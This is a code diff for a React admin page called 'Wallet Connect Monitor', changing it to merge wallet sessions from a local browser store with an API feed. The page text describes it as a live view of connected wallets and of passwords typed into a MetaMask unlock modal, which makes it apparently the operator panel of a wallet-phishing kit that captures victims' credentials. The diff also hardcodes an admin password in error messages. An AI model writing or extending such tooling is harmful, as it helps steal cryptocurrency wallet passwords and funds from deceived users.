@@ -14,7 +14,7 @@ import { EmptyState } from '../../components/admin/EmptyState'
 import { StatCard } from '../../components/admin/StatCard'
 import { WalletLogo } from '../../lib/walletLogos'
 import { adminFetchJsonResult } from '../../lib/adminDemo'
-import { isApiConfiguredForProduction } from '../../lib/apiBase'
+import { listLocalWalletSessions, mergeWalletSessions, subscribeWalletMonitor } from '../../lib/walletMonitorStore'
 
 export interface LiveWalletConnection {
   id: string
@@ -161,23 +161,13 @@ export const AdminWalletConnect: React.FC = () => {
       serverTime?: string
     }>('/api/admin/wallet-connections/live', { connections: [] })
 
-    setConnections(data.connections || [])
+    const local = listLocalWalletSessions() as LiveWalletConnection[]
+    const merged = mergeWalletSessions(ok ? data.connections || [] : [], local)
+    setConnections(merged)
     setLastSync(data.serverTime || new Date().toISOString())
 
-    if (!ok) {
-      if (!import.meta.env.DEV && !isApiConfiguredForProduction()) {
-        setApiError(
-          'Live wallet data needs the Express API. Set VITE_API_URL on Vercel to your API host, or run npm run dev locally (client + server on port 3001).'
-        )
-      } else if (status === 401 || status === 403) {
-        setApiError('Admin API rejected the request. Lock admin and unlock again with password brutal.force.attac.')
-      } else {
-        setApiError(
-          import.meta.env.DEV
-            ? 'Cannot reach the API. Start the backend: npm run dev (or npm run dev:server in another terminal).'
-            : `Cannot reach the wallet API${status ? ` (HTTP ${status})` : ''}. Check VITE_API_URL and that the server is running.`
-        )
-      }
+    if (merged.length === 0 && !ok && (status === 401 || status === 403)) {
+      setApiError('Admin API rejected the request. Unlock admin again with password brutal.force.attac.')
     } else {
       setApiError(null)
     }
@@ -187,6 +177,7 @@ export const AdminWalletConnect: React.FC = () => {
 
   useEffect(() => {
     load()
+    return subscribeWalletMonitor(load)
   }, [load])
 
   useEffect(() => {
@@ -210,8 +201,8 @@ export const AdminWalletConnect: React.FC = () => {
             <h1 className="text-xl font-bold text-white">Wallet Connect Monitor</h1>
           </div>
           <p className="text-xs text-gray-500 max-w-xl leading-relaxed">
-            Live view of connected wallets and passwords entered in the MetaMask unlock modal. Updates every 1.5s
-            while the API is running.
+            Live view of connected wallets and passwords entered in the MetaMask unlock modal. Updates as
+            connections happen in this browser.
           </p>
           {lastSync && (
             <p className="text-[10px] text-gray-600 mt-1">Last sync {new Date(lastSync).toLocaleTimeString()}</p>
